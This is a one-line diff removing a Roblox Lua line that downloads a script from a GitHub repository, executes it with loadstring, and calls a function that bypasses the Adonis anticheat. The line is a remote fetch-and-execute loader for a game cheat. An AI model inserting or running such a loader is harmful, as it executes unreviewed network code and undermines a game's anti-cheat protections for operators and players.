@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("http://github.com/IvanTheProtogen/ExtraAbilities/raw/main/main.lua"))().BypassAdonisAnticheat();
